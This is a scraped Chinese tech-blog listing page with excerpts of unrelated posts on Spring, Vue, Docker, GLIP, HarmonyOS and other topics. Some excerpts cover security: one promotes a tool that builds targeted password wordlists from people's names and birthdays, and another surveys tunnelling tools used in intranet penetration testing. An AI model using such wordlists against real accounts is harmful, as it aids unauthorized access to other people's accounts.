log4j.rootCategory=INFO, stdout log4j.appender.stdout=org.apache.log4j.ConsoleAppender log4j.appender.stdout.layout=org.apache.log4j.PatternLayout log4j.appender.stdout.layout.ConversionPattern=%d{ABSOLUTE} %5p %t %c{2}:%L - %m%n log4j.category.org.springframework.beans.factory=DEBUG applicationContext.xml为Spring的配置文件：在配置文件中完成注入
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; &lt;bean id="ud" class="com.demo.dao.UserDao"&gt;&lt;/bean&gt; &lt;bean id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2c7320b2c24d814afa0730ba6a0d375/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e310f1cef46fb4ad4b2d05b5101dbedd/" rel="bookmark">
			工厂设备数据采集系统初探
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、采集方式
1. 接PLC（串口/网口），设备信息（型号，通信协议），点位信息（类型short/int/long/float/double）
1.1 直连PLC
1.2 采集网关（PLC转modbus tcp，数据透传）
2. 外接采集模块
2.1 IO模块接到设备中，获取IO/AO信息
2.2 套入互感器，获取电流、电压、功率信息，通过功率来判断设备运行状态
3. 通过ocr识别HMI屏上的设备信息
二、系统架构
1. 采集程序（时序数据库）
2. 展示
2.1 平台：管理后台（参数配置，报表展示）
2.2 终端：电子看板
3. 消息转发
3.1 消息通知（mqtt/websocket）
3.2 对接MES/ERP
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17c2a220eb33aae7f66a4bd6b1a4cb88/" rel="bookmark">
			一款强大的密码字典生成工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一份强大的密码字典可使“肾透”事半功倍。那如何得到一份这样的字典呢？这需要我们根据收集到的信息自己来创建。
关于 UserNameDictTools是一款能根据用户姓名、生日等信息。生成输入自己的专属密码字典。同时支持将中文汉字姓名转换为拼音格式，支持多达11种拼音格式的转换。
工具特色 综合处理速度和准确度，选用了最新的拼音转换支持库。
支撑转成11种格式的用户名拼音（大家有什么好的建议，可以在公众号后台给我发消息留言）
对读入的中文汉字姓名列表文件进行编码识别，避免出现中文乱码问题。
对生成的字典进行文本去重，保证没有重复结果。
软件根目录放置了一个中文姓名字典，供大家使用。
使用指南 在作者的项目地址下载最新的工具包。
项目地址：https://github.com/abc123info/UserNameDictTools/releases运行（Windows运行需要java环境）
如果是kali 可以用下面命令运行
java -jar DictToolsV0.33.jar 接下来，我们准备一个用户姓名文件。如下
然后，选择对应的规则，点击生成拼音格式字典，程序会自动生成output.txt文件。
字典效果
交叉字典
复杂的密码字典
更多精彩文章 欢迎关注我们
`黑客&amp;网络安全如何学习
今天只要你给我的文章点赞，我私藏的网安学习资料一样免费共享给你们，来看看有哪些东西。
1.学习路线图 攻击和防守要学的东西也不少，具体要学的东西我都写在了上面的路线图，如果你能学完它们，你去就业和接私活完全没有问题。
2.视频教程 网上虽然也有很多的学习资源，但基本上都残缺不全的，这是我自己录的网安视频教程，上面路线图的每一个知识点，我都有配套的视频讲解。
内容涵盖了网络安全法学习、网络安全运营等保测评、渗透测试基础、漏洞详解、计算机基础知识等，都是网络安全入门必知必会的学习内容。
（都打包成一块的了，不能一一展开，总共300多集）
因篇幅有限，仅展示部分资料，需要点击下方链接即可前往获取
CSDN大礼包：《黑客&amp;网络安全入门&amp;进阶学习资源包》免费分享
3.技术文档和电子书 技术文档也是我自己整理的，包括我参加大型网安行动、CTF和挖SRC漏洞的经验和技术要点，电子书也有200多本，由于内容的敏感性，我就不一一展示了。
因篇幅有限，仅展示部分资料，需要点击下方链接即可前往获取
CSDN大礼包：《黑客&amp;网络安全入门&amp;进阶学习资源包》免费分享
4.工具包、面试题和源码 “工欲善其事必先利其器”我为大家总结出了最受欢迎的几十款款黑客工具。涉及范围主要集中在 信息收集、Android黑客工具、自动化工具、网络钓鱼等，感兴趣的同学不容错过。
还有我视频里讲的案例源码和对应的工具包，需要的话也可以拿走。
因篇幅有限，仅展示部分资料，需要点击下方链接即可前往获取
CSDN大礼包：《黑客&amp;网络安全入门&amp;进阶学习资源包》免费分享
最后就是我这几年整理的网安方面的面试题，如果你是要找网安方面的工作，它们绝对能帮你大忙。
这些题目都是大家在面试深信服、奇安信、腾讯或者其它大厂面试时经常遇到的，如果大家有好的题目或者好的见解欢迎分享。
参考解析：深信服官网、奇安信官网、Freebuf、csdn等
内容特点：条理清晰，含图像化表示更加易懂。
内容概要：包括 内网、操作系统、协议、渗透测试、安服、漏洞、注入、XSS、CSRF、SSRF、文件上传、文件下载、文件包含、XXE、逻辑漏洞、工具、SQLmap、NMAP、BP、MSF…
因篇幅有限，仅展示部分资料，需要点击下方链接即可前往获取
CSDN大礼包：《黑客&amp;网络安全入门&amp;进阶学习资源包》免费分享
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8c75fb5121e35cde71975331c4345e1/" rel="bookmark">
			这些内网穿透工具 你都知道吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在日常工作中我们需要将本地的某些端口如22 80 3306等端口分享。让别人或者不在同一局域网内的设备访问。我们需要端口映射（内网穿透）的方式让其暴露在公网，以便访问。
本文为大家总结常用内网映射的工具和方法，进行简单的总结。希望对你有所帮助。
FRP frp是一款主流的端口映射工具。笔者也一直在使用。部署简单、并且支持仪表盘。是做内网穿透的首选。详细部署可以移步文章《如何将Kali Linux 映射到公网》
优点：
支持多种架构 Windows Linux 树莓派 路由器等。
配置简单，支持仪表盘。
稳定 可靠 安全
不足：
需要自己购买服务器（流量走了自己的服务器 安全有保障）
延迟 网速等和你服务器带宽有关。
Lanproxy lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，目前仅支持tcp流量转发，可支持任何tcp上层协议（ssh访问、web服务器访问、远程桌面）同时有 web 配置界面。详细配置参考文章《一款内网映射神器 Lanproxy》
不足：
需要购买服务器，支持的终端比frp少。 ProxyChains ProxyChains是Linux和其他Unix下的代理工具。它可以使任何程序通过代理上网， 允许TCP和DNS通过代理隧道。在日常渗透测试中用地比较多。安装和使用可以参考文章《Kali代理神器 ProxyChains》 《内网渗透中ProxyChains的使用》
不足：
需要自行购买服务器或者IP池
部署和入门稍有难度
NPS nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，和Frp相差不大，但功能比frp更丰富。详细使用参考文章《可视化内网映射神器NPS》不足：
仍需单独购买服务器
支持的设备相比frp较少，但日常够用。
Lcx lcx是一款更加轻巧的端口转发工具，仅有Windows版和Linux版两个版本。详细部署参考文章《Lcx编译与端口转发》
上面这些工具，他们都很优秀。但是有个很致命的缺陷就是你需要一台公网服务器。在日常中，我们可以购买轻量服务器，相对比较便宜。但没有吗不需要服务器的方法呢？我们接着往下看。
zerotier zerotier用于搭建用于自己的虚拟网络，经过授权连接成功之后彼此都在同一网段，可以像在局域网一样互相访问。详细部署文章移步《无需公网 用zerotier异地组网》不足：
用地别人的服务器 安全性未知。
网速和延迟比较低。
IPV6(推荐) 随着ipv6的普及，我们可以利用ipv6直接来访问设备。当然访问者也必须是ipv6网络。详细部署移步文章《华硕官方固件安装alist+ddns-go》《无需公网IP 怎样远程访问内网设备》
优点：
访问网速快 安全
已基本普及
缺点：
ip地址太长不好记，且会发生变化。
针对上面问题可以购买域名配置ddns解决
部分设备需要用光猫超级管理员密码才能配置桥接模式。
“打洞” 针对没有ipv6的用户，我们可以在NAT1网络下，我们可以通过一种 “打洞” 的方式，将本地的 TCP 端口暴露至公网上。详情移步文章《通过“打洞”实现端口映射》
`黑客&amp;网络安全如何学习
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8c75fb5121e35cde71975331c4345e1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66bbbfc6606a3331d62cbce20ac8287f/" rel="bookmark">
			vue布局居中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要在Vue项目中实现居中布局，您可以使用以下方法：
方法一：使用flexbox布局
在父元素的样式中，添加display: flex;和justify-content: center;属性。
&lt;template&gt; &lt;div class="parent"&gt; &lt;div class="child"&gt; &lt;!-- 内容 --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;style&gt; .parent { display: flex; justify-content: center; } &lt;/style&gt; 方法二：使用grid布局
在父元素的样式中，添加display: grid;和place-items: center;属性。
&lt;template&gt; &lt;div class="parent"&gt; &lt;div class="child"&gt; &lt;!-- 内容 --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;style&gt; .parent { display: grid; place-items: center; } &lt;/style&gt; 方法三：使用绝对定位和transform属性
将子元素的样式设置为绝对定位，然后使用transform属性将它居中。
&lt;template&gt; &lt;div class="parent"&gt; &lt;div class="child"&gt; &lt;!-- 内容 --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;style&gt; .parent { position: relative; } .child { position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); } &lt;/style&gt; 以上是三种常见的居中布局方法，在Vue项目中可以根据具体的需求选择其中一种来实现居中效果。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd4f63e05abd00c8994dccc9259820a1/" rel="bookmark">
			SpringIOC之support模块DelegatingMessageSource
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主介绍：✌全网粉丝5W+，全栈开发工程师，从事多年软件开发，在大厂呆过。持有软件中级、六级等证书。可提供微服务项目搭建与毕业项目实战，博主也曾写过优秀论文，查重率极低，在这方面有丰富的经验✌
博主作品：《Java项目案例》主要基于SpringBoot+MyBatis/MyBatis-plus+MySQL+Vue等前后端分离项目，可以在左边的分类专栏找到更多项目。《Uniapp项目案例》有几个有uniapp教程，企业实战开发。《微服务实战》专栏是本人的实战经验总结，《Spring家族及微服务系列》专注Spring、SpringMVC、SpringBoot、SpringCloud系列、Nacos等源码解读、热门面试题、架构设计等。除此之外还有不少文章等你来细细品味，更多惊喜等着你哦
🍅uniapp微信小程序🍅面试题软考题免费使用，还可以使用ChatGPT，微信支付，扫码加群
点击这里预览
🍅开源项目免费哦(有vue2与vue3版本)：击这里克隆或者下载 🍅
🍅文末获取联系🍅精彩专栏推荐订阅👇🏻👇🏻 不然下次找不到哟
Java项目案例《100套》
https://blog.csdn.net/qq_57756904/category_12173599.html
uniapp小程序《100套》
https://blog.csdn.net/qq_57756904/category_12199600.html
有需求代码永远写不完，而方法才是破解之道，抖音有实战视频课程，某马某千等培训都是2万左右，甚至广东有本科院校单单一年就得3万4年就12万学费，而且还没有包括吃饭的钱。所以很划算了。另外博客左侧有源码阅读专栏，对于求职有很大帮助，当然对于工作也是有指导意义等。在大城市求职，你面试来回一趟多多少少都在12块左右，而且一般不会一次性就通过，还得面试几家。而如果你对源码以及微服务等有深度认识，这无疑给你的面试添砖加瓦更上一层楼。
最后再送一句：最好是学会了，而不是学废了！！！
DelegatingMessageSource 是 Spring Framework 中的一个类，它是 MessageSource 接口的一个实现，用于支持消息源的委派和消息查找的复合操作。MessageSource 接口是 Spring 中用于处理国际化消息的核心接口之一，它允许应用程序在不同的语言环境下获取消息。
DelegatingMessageSource 的主要作用是将消息查找请求委派给多个子消息源（MessageSource），以便根据不同的需求查找消息。这个类通常用于应对多种情况下的消息查找需求，例如：
从多个不同的消息源中查找消息。具有不同优先级的消息源。多个消息源共同协作以查找消息。 DelegatingMessageSource 的构造函数可以接受一个或多个子消息源作为参数，然后在消息查找时按照顺序依次委派给这些子消息源。当查找消息时，它会遍历所有的子消息源，直到找到消息或所有子消息源都无法找到消息为止。
以下是一个示例，演示如何使用 DelegatingMessageSource：
import org.springframework.context.support.DelegatingMessageSource; import org.springframework.context.support.ResourceBundleMessageSource; public class MessageSourceExample { public static void main(String[] args) { // 创建多个子消息源 ResourceBundleMessageSource source1 = new ResourceBundleMessageSource(); source1.setBasename("messages1"); ResourceBundleMessageSource source2 = new ResourceBundleMessageSource(); source2.setBasename("messages2"); // 创建委派消息源，将消息查找请求委派给子消息源 DelegatingMessageSource delegatingMessageSource = new DelegatingMessageSource(); delegatingMessageSource.addMessageSource(source1); delegatingMessageSource.addMessageSource(source2); // 查找消息 String message1 = delegatingMessageSource.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd4f63e05abd00c8994dccc9259820a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1761be1e157fa44aa5bf1a996f9f92b/" rel="bookmark">
			＜HarmonyOS主题课＞1~3课后习题汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		＜HarmonyOS第一课＞1~10课后习题汇总 1·使用DevEco Studio高效开发 单选题
用哪一种装饰器修饰的组件可作为页面入口组件？（B） A. @ComponentB. @EntryC. @PreviewD. @Builder ArkTS Stage模型支持API Version 9，关于其工程目录结构说法正确的是？（C） A. oh-package.json5用于存放应用级配置信息，包括签名、产品配置等B. build-profile.json5用于配置三方包声明文件的入口及包名C. module.json5包含HAP的配置信息、应用在具体设备上的配置信息以及应用的全局配置信息D. app.json5用于编写应用级编译构建任务脚本 DevEco Studio提供模拟器供开发者运行和调试HarmonyOS应用/服务，以下说法错误的是？（A） A. 本地模拟器是创建和运行在本地计算机上的，需要登录授权B. 本地模拟器支持音量大小调节、电池电量调节、屏幕旋转等功能C. 向本地模拟器安装应用/服务的时候，不需要给应用签名D. DevEco Studio会启动应用/服务的编译构建，完成后应用/服务即可运行在本地模拟器上 多选题
DevEco Studio支持使用多种语言进行应用/服务的开发，包括ArkTS、JS和C/C++。在编写应用/服务阶段，可以通过以下哪些方法提升编码效率？（ABCD） A. 提供代码的智能补齐能力，编辑器工具会分析上下文并理解项目内容，并根据输入的内容，提示可补齐的类、方法、字段和关键字的名称等B. 在编辑器中调用ArkTS API接口或ArkTS/JS组件时，支持在编辑器中快速、精准调取出对应的参考文档C. 代码格式化功能可以帮助您快速的调整和规范代码格式，提升代码的美观度和可读性D. 如果输入的语法不符合编码规范，或者出现语义语法错误，编辑器会显示错误或警告 关于预览器的使用，以下哪些说法是正确的？（ABCD） A. 在开发界面UI代码过程中，如果添加或删除了UI组件，您只需Ctrl+S进行保存，然后预览器就会立即刷新预览结果B. 在预览器界面，可以在预览器中操作应用/服务的界面交互动作，如单击、跳转、滑动等，与应用/服务运行在真机设备上的界面交互体验一致C. 组件预览通过在组件前添加注解@Preview实现D. 页面预览通过在工程的ets文件头部添加注解@Entry实现 2·三方库 判断题
三方组件是开发者在系统能力的基础上进行了一层具体功能的封装，对其能力进行拓展的工具。（正确）可以通过ohpm uninstall 指令下载指定的三方库（错误）
解析：ohpm install指令下载指定的三方库lottie使用loadAnimation方法加载动画。（正确） 单选题
通过ohpm安装lottie后，在哪个文件中会生成相关的配置信息？（B） A. module.json5B. oh-package.json5C. app.json5D. main_page.json lottie订阅事件的API为？（C） A. lottie.setSpeed()B. lottie.setDirection()C. animationItem.addEventListener()D. animationItem.removeEventListener()
多选题 下列属于lottie提供的动画控制API的是？（ABCD） A. lottie.play()B. lottie.pause()C. lottie.stop()D. lottie.goToAndPlay() 3·云开发 判断题
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1761be1e157fa44aa5bf1a996f9f92b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66a54c0233bb52dddbfb38605e41659e/" rel="bookmark">
			接了一条路由器视频广告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关注卢松松，会经常给你分享一些我的经验和观点。
2023年7月，松松团队荣幸的承接了“某口袋路由器”的短视频广告。
我们向客户索取了了几个卖点：
1.家用美观不用走线(无线小巧美观)
外出便携(出差、户外直播、露营等，只要充满电或者能充电就行); 3.操作非常简单(扫描即可联网，女生、小白都会，不用各种调试参数)
4.还有网速快(大几百M)，比较稳定
于是我们结合着客户提出的需求和我们的想法结合在一起，把这几个卖点结合图像、文字的形式展示出去。
这是我们给客户写的脚本文案：
因为我知道，90%的客户是希望直接打赤裸裸的广告的。所以我们也不搞剧情，直接展示产品。有了脚本、思路，拍摄视频就快了很多。第一版视频我们仅仅拍了一下午就搞定了。随后第二天客户给了第二次修改意见：
客户二次补充意见如下：
1.连接的两个镜头可删掉
2.加句这个文案“有了XXX，再也不需要有线的路由器啦~”
3.这个镜头可以俏皮一点加个文案：上班摸鱼神器，保障上网隐私
解释一下：如果若水用CC联网，不用公司的网，HR或者老板是监控不了若水摸鱼、划水、看剧、打游戏的
4.因为若水是女孩子，所以最后一个镜头，能把CC跟可乐的对比，换成CC跟若水老师的粉饼盒对比，就堪称完美啦。
在和客户沟通完毕后，于是我们又增加了一个户外的场景，“假装户外露营”，体现这块产品在户外的WIFI效果好的。最后的镜头虽然只有短短15秒，但却花了一下午，我们还特意把家里的ipad拿出来在户外打游戏，以此证明用了这款路由器是户外也不卡顿。
写在最后：
这是我们很用心做的一条广告，也是因为这条广告，松松团队的转型之路正式开启……
卢松松是一位自媒体人、短视频博主。也是创业者必看的账号，关注草根创业圈、科技互联网、自媒体和短视频行业。感谢您的关注！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88cab3315b2890c5732c4aaf526b69b6/" rel="bookmark">
			SpringCloud微服务详解，Dockerfile自定义镜像、DockerCompose
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、SpringCloud介绍
二、什么是微服务
三、Dockerfile自定义镜像介绍
四、DockerCompose介绍
一、SpringCloud介绍 Spring Cloud是一个用于快速构建分布式系统的开源框架。它基于Spring Boot，为开发者提供了一套简单、高效、可靠的分布式系统组件，用于解决分布式系统开发中的常见问题。Spring Cloud包含一系列子项目，每个子项目都提供了一种特定的分布式系统功能。
Spring Cloud的核心特性包括：
服务注册与发现（Service Registration and Discovery）：通过使用服务注册和发现组件（如Netflix Eureka、Consul等），实现服务的自动注册和发现，使得服务之间可以进行无缝的通信。
配置管理（Configuration Management）：通过使用Spring Cloud Config，可以将应用程序的配置信息集中管理，并实现配置文件的动态更新和版本控制。
负载均衡（Load Balancing）：Spring Cloud提供了多种负载均衡器（如Netflix Ribbon、Spring Cloud LoadBalancer等），用于在服务消费者之间进行负载均衡，提高系统的可用性和性能。
断路器（Circuit Breaker）：通过使用断路器组件（如Netflix Hystrix、Resilience4j等），实现服务调用的容错和熔断，防止分布式系统中的故障扩散。
链路追踪（Distributed Tracing）：通过使用分布式跟踪系统（如Zipkin、SkyWalking等），可以追踪请求在分布式系统中的调用链路，帮助开发者进行故障排查和性能优化。
API网关（API Gateway）：通过使用Spring Cloud Gateway、Netflix Zuul等组件，实现对外暴露的API的统一入口和访问控制，提供路由、过滤、限流等功能。
分布式消息传递（Distributed Messaging）：通过使用消息中间件（如Apache Kafka、RabbitMQ等），实现异步消息传递和事件驱动的架构。
Spring Cloud的出现简化了分布式系统的开发和部署，提供了一系列强大的工具和组件，帮助开发者构建高可用、可扩展的微服务架构。
二、什么是微服务 微服务（Microservices）是一种架构风格,将大型应用程序拆分为一组更小、更独立的服务。每个微服务在独立的进程中运行,可以独立部署、扩展和管理。微服务架构的主要思想是将应用程序拆分成多个小型服务,每个服务都专注于处理特定的业务功能,并通过轻量级的通信机制来实现彼此之间的协作。微服务架构的特点包括：
拆分：大型应用程序被拆分为多个小型服务,每个服务关注单一的业务功能,实现了高内聚和低耦合。
独立部署和扩展：每个微服务都可以独立部署,可以根据需求独立扩展,提高了系统的可伸缩性。
技术多样性：每个微服务可以使用不同的技术栈和编程语言,选择最适合的工具和框架。
弹性和容错性：由于每个微服务都运行在独立的进程中,一个服务的故障不会影响其他服务的正常运行,从而提高了系统的弹性和容错性。
松耦合和可替换性：微服务之间通过轻量级通信机制进行交互,可以相对容易地替换、升级或重新设计某个服务,而不会对整个系统产生影响。
可维护性和可测试性：每个微服务都是相对独立的,可以独立进行开发、测试和维护,简化了系统的复杂性。
微服务架构适用于需要快速迭代和灵活扩展的大型复杂应用,它提供了一种解决单体应用程序难以扩展和维护的方案。然而,微服务架构也带来了一些挑战,如服务间通信的复杂性、数据一致性的处理、分布式事务的管理等,需要仔细考虑和解决。
三、Dockerfile自定义镜像介绍 Dockerfile是用于定义Docker镜像构建过程的文本文件。通过编写Dockerfile,可以自定义构建一个符合自己需求的Docker镜像。以下是Dockerfile自定义镜像的介绍：
基础镜像选择：Dockerfile的第一行通常是选择一个基础镜像作为构建的起点。可以选择官方提供的基础镜像（如ubuntu,alpine等），或者是其他已经存在的镜像。
构建环境：在Dockerfile中可以设置构建镜像时所需要的环境变量和工作目录。可以使用ENV指令设置环境变量，使用WORKDIR指令设置工作目录。
安装软件和依赖：使用RUN指令可以执行命令来安装软件和依赖。比如可以使用apt-get命令来安装软件包，或者使用pip命令来安装Python包。
复制文件：使用COPY或者ADD指令可以将本地文件复制到镜像中。可以复制应用程序代码、配置文件等。
暴露端口：使用EXPOSE指令可以声明容器运行时需要暴露的端口。这样在启动容器时可以通过-p参数映射容器端口到宿主机。
启动命令：使用CMD或者ENTRYPOINT指令可以设置容器启动时要执行的命令。可以是一个具体的命令，或者是启动一个服务的脚本。
运行构建：通过在命令行中使用docker build命令来执行Dockerfile，并构建镜像。可以指定一个标签来给镜像命名。
通过编写自定义的Dockerfile,可以根据具体需求构建出一个定制化的镜像。这样可以减小镜像体积、提高镜像构建速度，并且保证镜像中只包含必要的组件和依赖。定制化的镜像也可以更好地适应不同的部署场景和需求。
四、DockerCompose介绍 Docker Compose 是一个用于定义和运行多个 Docker 容器的工具。它使用一个 YAML 文件来配置应用程序的服务、网络和卷等方面的设置。通过使用 Docker Compose，可以轻松地定义、启动和停止由多个容器组成的应用程序。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88cab3315b2890c5732c4aaf526b69b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93b2aedea4b26023e176b8bfbb1c8299/" rel="bookmark">
			GLIP：引入语言图像预训练以进行目标检测
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天，我们将深入研究一篇在语言图像预训练方面借鉴了CLIP巨大成功的论文，并将其扩展到目标检测任务的论文：GLIP —— Grounded Language-Image Pre-training（基于语言图像的预训练）。我们将涵盖论文的关键概念和发现，并通过提供更多上下文以及对图像和实验结果添加注释，使其易于理解。让我们开始吧！
论文：基于语言
图像的预训练
代码：https://github.com/microsoft/GLIP
首次发布日期：2021年12月7日
作者：Liunian Harold Li，Pengchuan Zhang，Haotian Zhang，Jianwei Yang，Chunyuan Li，Yiwu Zhong，Lijuan Wang，Lu Yuan，Lei Zhang，Jenq-Neng Hwang，Kai-Wei Chang，Jianfeng Gao
类别：表示学习，目标检测，短语定位，多模态深度学习，计算机视觉，自然语言处理，基础模型
大纲
背景与背景
宣称的贡献
方法
实验
进一步阅读和资源
背景与背景
GLIP（Grounded Language-Image Pre-training）是一种多模态语言图像模型。类似于CLIP（对比语言图像预训练），它执行对比性预训练以学习语义丰富的表示，并在其模态之间对齐它们。虽然CLIP在图像级别学习这些表示，这意味着一个句子描述整个图像，但GLIP旨在将此方法扩展到对象级别的表示，意味着一个句子可能对应于图像中的多个对象。在文本提示中识别单个标记与图像中的对象或区域之间的对应关系的任务称为短语定位。因此，在GLIP中有“Grounded”一词。
因此，GLIP的目标是：
统一大规模预训练的短语定位和目标检测。
为零样本目标检测提供灵活的框架，其中灵活意味着不受限于固定的类别集。
构建一个预训练模型，以零样本或少样本的方式无缝转移到各种任务和领域。
有了这样的模型，您可以使用文本提示在给定的输入图像中找到感兴趣的对象或区域。而且最好的部分是：您不受预定义类别的限制。
GLIP对不同图像和提示格式的输出
您可以进一步处理这些检测（例如将其输入到跟踪系统中），或创建一个包含感兴趣的特定类别的自定义数据集，并使用这些数据集来训练您自己的监督检测系统。您不仅可以覆盖罕见或非常特定的类别，而且还可以为手动标签的创建节省大量时间和金钱。正如我们将在后面看到的，GLIP的作者通过引入教师-学生框架，提出了类似的想法，以进一步提高性能。
GLIP已经被深度学习中的许多其他项目和领域采用。例如，GLIGEN（基于语言图像生成）使用GLIP作为潜在扩散模型的图像生成的条件，以增加可控性。此外，GLIP已与其他模型结合使用，例如DINO（具有改进的去噪锚定框的DETR）和SAM（Segment Anything Model），分别形成GroundingDINO和Grounded-Segment-Anything。GLIPv2将初始的GLIP模型扩展到视觉语言理解，以不仅改善短语定位，还启用视觉问答任务。
宣称的贡献：
大规模预训练，结合短语定位和目标检测
提供对目标检测和短语定位的统一视图
深度跨模态融合，学习高质量的语言感知视觉表示，并实现卓越的迁移学习性能。
表明在深度视觉语言融合（例如GLIP）中，与浅融合网络（例如CLIP）相比，对提示进行微调更为有效。
方法
对GLIP能够做什么有了一个大致的了解，让我们更详细地研究论文的细节。
架构概述
从高层次上看，GLIP的架构在某种程度上与CLIP的架构非常相似，它也包括一个文本编码器、一个图像编码器和某种在文本和图像特征的相似性上进行对比学习的模块。GLIP的架构如图2所示。
框架架构
在文本和图像编码器之后，GLIP添加了一个语言图像感知的深度融合模块。该模块执行跨模态注意力并提取进一步的特征。在结果区域特征和单词特征上计算余弦相似性。在训练期间，最大化匹配对的相似性，同时对不正确的对进行最小化。与CLIP不同，其中匹配对位于相似性矩阵的对角线上，GLIP中的匹配不是在句子级别上执行的，而是在（子）词级别上执行，通常位于对角线之外的位置。
将短语定位定义为目标检测问题
作者指出，短语定位（将单词与图像中的对象/区域相关联）的问题可以被制定为目标检测目标，其中标准损失目标为：
定位损失与预测边界框的质量有关，具体取决于格式，可能是框的大小和位置。分类损失是统一性的关键部分。通过在文本-图像特征的相似性分数上计算对数几率，而不是在图像分类器的对数几率上计算，可以使用相同的损失目标进行训练。
不同的模型变体
为了展示作者的设计选择和模型规模的效果，训练了五种不同的模型变体：
模型变体
教师-学生预训练
为了提高GLIP的性能，作者在人工注释的数据GoldG上训练了GLIP-T（C）模型（见图3），从而生成来自互联网上的文本-图像对的定位数据。他们将此模型称为教师模型，并随后训练一个学生模型，将训练教师的数据和教师生成的数据一并输入。
注意：尽管使用了教师和学生这些术语，但这与知识蒸馏中使用的过程并不相同，知识蒸馏中会训练一个较小的学生模型以匹配较大的教师模型的输出。
教师-学生预训练
有趣的是，正如我们将在实验中看到的那样，对于零样本和少样本检测，学生在许多（但不是全部）数据集上超过了教师。为什么呢？论文假设，即使教师以低置信度提供预测（他们称之为“学问猜测”），它在学生使用的生成数据集中变为真实标签（他们称之为“监督信号”）。
实验
GLIP论文提出了各种实验和消融研究，主要涉及：
零样本领域转移
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/93b2aedea4b26023e176b8bfbb1c8299/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f4c23723f25144b50dd01ad4fc9c6bde/" rel="bookmark">
			React-Hoc高阶组件与css-in-js技术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、什么是React-Hoc
二、什么是高阶组件
三、什么是css-in-js技术
一、什么是React-Hoc React-HOC（Higher-Order Component，高阶组件）是React中一种用于重用组件逻辑的模式。它本质上是一个函数，接受一个组件作为参数并返回一个新的组件。
HOC可以用于在不修改原始组件的情况下，为组件添加额外的功能，例如对组件进行状态管理、将共享的逻辑抽象出来、处理权限控制等。
HOC的使用方法是将要增强的组件作为参数传递给HOC函数，然后返回一个新的增强后的组件。这种模式使得组件的功能可以被动态地组合和扩展。
React中常见的一些HOC包括：redux的connect函数、react-router的withRouter函数等。通过使用HOC，可以实现更好的代码复用和组件的功能扩展。
二、什么是高阶组件 高阶组件（Higher-Order Component，HOC）是一种在React中用于重用组件逻辑的模式。它本质上是一个函数，接受一个组件作为参数并返回一个新的组件。
高阶组件可以用于在不修改原始组件的情况下，为组件添加额外的功能或修改现有的功能。它通过将通用的逻辑抽象出来，将其应用于多个组件，从而实现代码的复用和组件的功能扩展。
具体而言，高阶组件可以实现以下功能：
属性代理（Props Proxy）：通过修改组件的props，传递额外的数据或功能给被包裹的组件。
反向继承（Inheritance Inversion）：通过继承被包裹的组件，对其进行修改或增强。
高阶组件的使用方法是将要增强的组件作为参数传递给高阶组件函数，然后返回一个新的增强后的组件。这种模式使得组件的功能可以被动态地组合和扩展。
React中常见的一些高阶组件包括：Redux的connect函数、React Router的withRouter函数等。
高阶组件并不是React的官方概念，而是一种常见的设计模式，用于解决组件逻辑复用的问题。
三、什么是css-in-js技术 CSS-in-JS是一种前端开发技术，用于将CSS样式直接嵌入到JavaScript代码中。它通过在JavaScript中编写CSS样式规则，并将其动态地应用于组件，实现了组件级别的样式封装和管理。CSS-in-JS的主要思想是将样式与组件逻辑紧密结合，以组件为单位管理样式，从而提高组件的可重用性和维护性。
CSS-in-JS的几种常见实现方式包括：
Inline Styles：将样式直接作为JavaScript对象的属性，通过动态设置组件的style属性来应用样式。
CSS Modules：将CSS样式文件中的类名映射为JavaScript对象的属性名，通过引入这个对象来应用样式。
